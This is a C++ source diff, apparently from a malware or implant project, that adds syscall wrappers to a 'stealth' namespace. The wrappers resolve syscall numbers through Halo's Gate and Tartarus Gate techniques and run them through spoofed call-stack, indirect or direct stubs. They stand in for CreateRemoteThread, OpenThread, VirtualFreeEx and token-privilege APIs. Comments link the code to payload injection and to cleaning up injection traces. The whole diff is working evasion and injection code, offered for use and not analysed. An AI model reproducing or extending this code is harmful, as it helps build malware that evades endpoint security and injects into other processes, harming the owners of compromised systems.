@@ -312,6 +312,15 @@ bool SyscallResolver::Initialize() {
     m_numbers.NtDelayExecution          = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtDelayExecution")));
     m_numbers.NtContinue                = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtContinue")));
     m_numbers.NtWaitForSingleObject     = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtWaitForSingleObject")));
+    // ★ BUILD 556: P0+P1 syscall 替代 — 新提取 4 个 SSN
+    //   NtOpenThread             — 替代 OpenThread (payload.cpp CleanupInjectionTraces)
+    //   NtAdjustPrivilegesToken  — 替代 AdjustTokenPrivileges (stealth_process.cpp)
+    //   NtOpenProcessToken       — 替代 OpenProcessToken (stealth_process.cpp)
+    //   NtQueryInformationToken  — 替代 GetTokenInformation (stealth_process.cpp)
+    m_numbers.NtOpenThread              = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenThread")));
+    m_numbers.NtAdjustPrivilegesToken   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtAdjustPrivilegesToken")));
+    m_numbers.NtOpenProcessToken        = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenProcessToken")));
+    m_numbers.NtQueryInformationToken   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQueryInformationToken")));
 
     // 2. 检查关键函数是否被 Hook, 必要时启用 Halo's Gate
     // (延迟到首次实际调用时, 避免在初始化阶段触发表征)
@@ -1307,6 +1316,222 @@ NTSTATUS SysClose(HANDLE handle, SyscallMethod method) {
     }
     using Fn = NTSTATUS(NTAPI*)(HANDLE);
     return reinterpret_cast<Fn>(stub)(handle);
+}
+
+// ============================================================
+// ★ BUILD 556: P0+P1 syscall 替代 — 新增 6 个 Sys* 实现
+//   实现模式: Initialize SSN → DecideMethod →
+//             StackSpoof/Indirect/Tartarus/Direct 四级降级
+//   参考: SysClose (L1284) + SysQueryInformationProcess (L1252)
+// ============================================================
+
+// ---- SysCreateThreadEx (替代 CreateRemoteThread) ----
+NTSTATUS SysCreateThreadEx(
+    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
+    PVOID ObjectAttributes, HANDLE ProcessHandle,
+    PVOID StartAddress, PVOID Argument,
+    ULONG CreateFlags, SIZE_T ZeroBits,
+    SIZE_T StackSize, SIZE_T MaximumStackSize,
+    PVOID AttributeList, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtCreateThreadEx;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtCreateThreadEx; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
+                                    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtCreateThreadEx"));
+        return fn ? fn(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
+                       StartAddress, Argument, CreateFlags, ZeroBits,
+                       StackSize, MaximumStackSize, AttributeList) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
+                                ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+    return reinterpret_cast<Fn>(stub)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
+                                      StartAddress, Argument, CreateFlags, ZeroBits,
+                                      StackSize, MaximumStackSize, AttributeList);
+}
+
+// ---- SysFreeVirtualMemory (替代 VirtualFreeEx) ----
+NTSTATUS SysFreeVirtualMemory(
+    HANDLE ProcessHandle, PVOID* BaseAddress,
+    PSIZE_T RegionSize, ULONG FreeType, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtFreeVirtualMemory;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtFreeVirtualMemory; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtFreeVirtualMemory"));
+        return fn ? fn(ProcessHandle, BaseAddress, RegionSize, FreeType) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG);
+    return reinterpret_cast<Fn>(stub)(ProcessHandle, BaseAddress, RegionSize, FreeType);
+}
+
+// ---- SysOpenThread (替代 OpenThread) ----
+NTSTATUS SysOpenThread(
+    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId,
+    SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtOpenThread;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtOpenThread; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtOpenThread"));
+        return fn ? fn(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+    return reinterpret_cast<Fn>(stub)(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId);
+}
+
+// ---- SysOpenProcessToken (替代 OpenProcessToken) ----
+NTSTATUS SysOpenProcessToken(
+    HANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
+    PHANDLE TokenHandle, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtOpenProcessToken;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtOpenProcessToken; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, PHANDLE);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtOpenProcessToken"));
+        return fn ? fn(ProcessHandle, DesiredAccess, TokenHandle) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, PHANDLE);
+    return reinterpret_cast<Fn>(stub)(ProcessHandle, DesiredAccess, TokenHandle);
+}
+
+// ---- SysAdjustPrivilegesToken (替代 AdjustTokenPrivileges) ----
+NTSTATUS SysAdjustPrivilegesToken(
+    HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
+    PVOID NewState, ULONG BufferLength,
+    PVOID PreviousState, PULONG ReturnLength, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtAdjustPrivilegesToken;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtAdjustPrivilegesToken; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PVOID, ULONG, PVOID, PULONG);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtAdjustPrivilegesToken"));
+        return fn ? fn(TokenHandle, DisableAllPrivileges, NewState, BufferLength,
+                       PreviousState, ReturnLength) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(HANDLE, BOOLEAN, PVOID, ULONG, PVOID, PULONG);
+    return reinterpret_cast<Fn>(stub)(TokenHandle, DisableAllPrivileges, NewState, BufferLength,
+                                      PreviousState, ReturnLength);
+}
+
+// ---- SysQueryInformationToken (替代 GetTokenInformation) ----
+NTSTATUS SysQueryInformationToken(
+    HANDLE TokenHandle, ULONG TokenInformationClass,
+    PVOID TokenInformation, ULONG TokenInformationLength,
+    PULONG ReturnLength, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtQueryInformationToken;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtQueryInformationToken; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtQueryInformationToken"));
+        return fn ? fn(TokenHandle, TokenInformationClass, TokenInformation,
+                       TokenInformationLength, ReturnLength) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+    return reinterpret_cast<Fn>(stub)(TokenHandle, TokenInformationClass, TokenInformation,
+                                      TokenInformationLength, ReturnLength);
 }
 
 } // namespace stealth
